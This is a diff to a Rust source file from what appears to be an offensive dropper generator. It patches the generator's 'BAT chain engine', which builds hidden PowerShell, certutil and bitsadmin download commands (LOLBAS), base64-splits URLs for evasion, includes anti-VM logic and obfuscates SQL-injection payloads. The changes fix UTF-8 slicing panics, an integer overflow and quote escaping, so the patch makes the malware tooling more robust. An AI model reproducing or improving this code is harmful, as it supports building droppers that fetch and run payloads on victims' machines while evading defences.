@@ -208,13 +208,23 @@ pub fn visualize_zero_width(text: &str) -> String {
 //  BAT CHAIN ENGINE — used by batgen module
 // ============================================================================
 
+/// Largest valid UTF-8 char boundary at or below the byte midpoint. Slicing a
+/// `&str` at a raw `len()/2` panics (process abort under `panic = "abort"`) when
+/// the input contains multi-byte characters; callers split here instead.
+fn char_boundary_mid(s: &str) -> usize {
+    let mut mid = s.len() / 2;
+    while mid > 0 && !s.is_char_boundary(mid) {
+        mid -= 1;
+    }
+    mid
+}
+
 /// Split a URL into two base64-encoded halves for evasion
 pub fn base64_split_encode(url: &str) -> Result<(String, String)> {
     if url.is_empty() {
         anyhow::bail!("URL must not be empty");
     }
-    let mid = url.len() / 2;
-    let (first, second) = url.split_at(mid);
+    let (first, second) = url.split_at(char_boundary_mid(url));
     Ok((BASE64_STANDARD.encode(first), BASE64_STANDARD.encode(second)))
 }
 
@@ -489,12 +499,17 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
 
 /// Generate a download command using the selected LOLBAS method
 pub fn build_downloader(method: DownloadMethod, url: &str, outfile: &str) -> String {
-    // Escape for PowerShell single-quoted strings
+    // Escape for PowerShell single-quoted strings (doubling is the only valid escape).
     let safe_url = url.replace('\'', "''");
     let safe_outfile = outfile.replace('\'', "''");
-    // Escape for double-quoted contexts (certutil/bitsadmin)
-    let safe_url_dq = url.replace('"', "\\\"");
-    let safe_outfile_dq = outfile.replace('"', "\\\"");
+    // cmd.exe / BAT have NO escape for a double-quote inside a double-quoted
+    // argument — a `"` always terminates the string. The old `\"` therefore
+    // left a command-injection breakout in the certutil/bitsadmin downloaders
+    // whenever the URL/outfile contained a quote. A raw `"` is invalid in a URL
+    // (it must be percent-encoded as %22) and is an illegal Windows filename
+    // character, so neutralise it rather than pretend to escape it.
+    let safe_url_dq = url.replace('"', "%22");
+    let safe_outfile_dq = outfile.replace('"', "");
     match method {
         DownloadMethod::PowerShell => format!(
             "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{safe_url}' -OutFile '{safe_outfile}' -UseBasicParsing }} catch {{ exit 1 }}\""
@@ -664,7 +679,10 @@ pub fn parse_delay(input: &str) -> Result<u32> {
         mins.parse().map_err(|e| anyhow!("Invalid minutes format: {e}"))
     } else if let Some(days) = lower.strip_suffix('d') {
         let d: u32 = days.parse().map_err(|e| anyhow!("Invalid days format: {e}"))?;
-        Ok(d * 1440)
+        // `d * 1440` overflows u32 past ~2.98M days (panic in debug, silent wrap
+        // in release); reject oversized input instead.
+        d.checked_mul(1440)
+            .ok_or_else(|| anyhow!("Delay too large: {} days exceeds the maximum", d))
     } else {
         input.parse().map_err(|e| anyhow!("Invalid delay format (use '10m' or '2d'): {e}"))
     }
@@ -1307,7 +1325,9 @@ fn sql_case_toggle(payload: &str) -> Vec<String> {
 fn sql_concat_split(payload: &str) -> Vec<String> {
     let mut results = Vec::new();
     if payload.len() >= 4 {
-        let mid = payload.len() / 2;
+        // char-boundary split: a raw `len()/2` byte index would panic on a
+        // multi-byte-UTF-8 payload.
+        let mid = char_boundary_mid(payload);
         results.push(format!("CONCAT('{}','{}')", &payload[..mid], &payload[mid..]));
         results.push(format!("'{}'+'{}'" , &payload[..mid], &payload[mid..]));
         results.push(format!("'{}'||'{}'", &payload[..mid], &payload[mid..]));
